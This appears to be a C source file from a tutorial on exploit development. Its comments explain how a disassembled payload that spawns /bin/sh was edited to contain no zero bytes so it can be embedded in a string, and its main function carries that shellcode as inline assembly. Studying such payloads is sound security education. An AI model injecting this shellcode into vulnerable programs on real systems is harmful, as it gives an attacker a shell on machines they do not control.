/*
The assembly here is based on that extracted from disassembling shellcode
(and adding an `exit()` syscall).

This is the original assembly:
    jmp . + 40
    pop %rbp
    mov %rbp,0x8(%rbp)
    mov $0x0,0x10(%rbp)
    mov $0x0,%edx
    mov $0x3b,%eax
    lea 0x8(%rbp),%rsi
    mov 0x8(%rbp),%rdi
    syscall
    xor %rdi,%rdi
    mov $0x3c,%al
    syscall
    call . - 38
    .string "/bin/sh"
The version used below has been manually tweaked in order to eliminate all
zeroes in the byte code (this makes the byte code amenable to being embedded
in a string).

To compile this asm and get the corresponding byte code, run:
make shellcode_asm && gdb shellcode_asm -ex="disassemble /r main"

Note that we cannot actually run this executable, because the code attempts to
modify itself. The OS will mark the code pages as read-only, and will not allow
us to do this. That's where the next stage, sc_stckex.c comes in...
*/

int main() {
    asm volatile("jmp . + 33\n\t"
                 "pop %rbp\n\t"
                 "mov %rbp,0x8(%rbp)\n\t"
                 "xor %eax,%eax\n\t"
                 "mov %eax,0x10(%rbp)\n\t"
                 "mov %eax,%edx\n\t"
                 "mov $0x3b,%al\n\t"
                 "lea 0x8(%rbp),%rsi\n\t"
                 "mov 0x8(%rbp),%rdi\n\t"
                 "syscall\n\t"
                 "xor %rdi,%rdi\n\t"
                 "mov $0x3c,%al\n\t"
                 "syscall\n\t"
                 "call . - 31\n\t"
                 ".string \"/bin/sh\"");
}
